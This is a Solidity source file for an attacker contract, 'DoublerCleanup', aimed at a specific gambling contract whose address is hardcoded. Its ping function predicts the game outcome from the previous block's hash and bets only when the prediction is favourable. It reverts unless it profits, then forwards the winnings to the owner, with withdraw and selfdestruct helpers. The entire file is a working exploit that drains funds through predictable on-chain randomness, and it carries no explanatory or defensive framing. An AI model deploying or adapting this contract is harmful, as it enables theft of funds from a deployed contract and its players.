pragma solidity ^0.5.0;

interface TargetInterface {
    function Set_your_game_number(string calldata s) external payable;
}

contract DoublerCleanup {
    
    address payable private constant targetAddress = 0x28cC60C7c651F3E81E4B85B7a66366Df0809870f;

    address payable private owner;
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    constructor() public payable {
        owner = msg.sender;
    }
    
    function ping(bool _keepBalance) public payable onlyOwner {
        uint targetBalance = targetAddress.balance;
        require(targetBalance > 0.2 ether);

        uint8 betNum = uint8(blockhash(block.number - 1)[31]) & 0xf;
        require(betNum != 0x0 && betNum != 0xf);
        string memory betString = betNum < 8 ? "L" : "H";

        uint256 ourBalanceInitial = address(this).balance;
        
        if (targetBalance < 0.3 ether) {
            uint256 toAdd = 0.3 ether - targetBalance;
            (bool success,) = targetAddress.call.value(toAdd)("");
            require(success);
        }

        TargetInterface target = TargetInterface(targetAddress);
        target.Set_your_game_number.value(0.1 ether)(betString);

        require(address(this).balance > ourBalanceInitial);
        
        if (!_keepBalance) {
            owner.transfer(address(this).balance);
        }
    }
    
    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }    
    
    function kill() public onlyOwner {
        selfdestruct(owner);
    }    
    
    function () external payable {
    }
    
}